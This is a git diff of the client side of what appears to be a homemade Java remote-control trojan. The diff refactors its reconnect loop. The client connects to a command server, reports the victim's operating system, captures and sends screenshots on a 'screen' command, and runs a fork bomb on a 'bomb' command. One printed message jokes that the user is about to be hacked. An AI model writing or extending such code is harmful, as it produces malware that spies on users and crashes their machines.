@@ -17,22 +17,22 @@ public class Client {
     static boolean isConnected = false;
 
     public static void main(String[] args) {
-        try {
-            System.out.println("Opa ta na hora de ser haskiado");
-            while(!isConnected) {
+        System.out.println("Opa ta na hora de ser haskiado");
+        while (true) {
+            try {
                 beginConnection();
+            } catch (ServerOfflineException e) {
+                System.out.println("Server desligou agora negao");
             }
-        } catch(Exception e) {
-            e.printStackTrace();
         }
     }
 
-    private static void beginConnection() {
+    private static void beginConnection() throws ServerOfflineException {
         try {
             connection = new Connection(new Socket("localhost", 27015));
             isConnected = true;
-        } catch(IOException e) {
-            //TODO might cause a stackoverflow after many times that the server goes offline, to-analyze
+            System.out.println("Connected, boii");
+        } catch (IOException e) {
             System.out.println("Server is offline");
             disconnected();
             return;
@@ -43,19 +43,16 @@ public class Client {
         Message osMessage = new Message("print", "User is using " + MY_OS.name());
         connection.sendMessage(osMessage);
 
-        try {
-            while(true) {
-                handleServerCommand();
-            }
-        } catch(ServerOfflineException e) {
-            beginConnection();
+        while (true) {
+            handleServerCommand();
         }
+
     }
 
     private static void handleServerCommand() throws ServerOfflineException {
         String command = connection.readMessage().getCommand();
 
-        switch(command) {
+        switch (command) {
             case "screen":
                 ScreenUtils.sendScreenshot(connection, false);
                 break;
@@ -68,7 +65,7 @@ public class Client {
             case "bomb":
                 try {
                     Bomb.explode();
-                } catch(IOException e) {
+                } catch (IOException e) {
                     connection.sendMessage(new Message("print", "ForkBomb failed: " + e.getMessage()));
                 }
                 break;
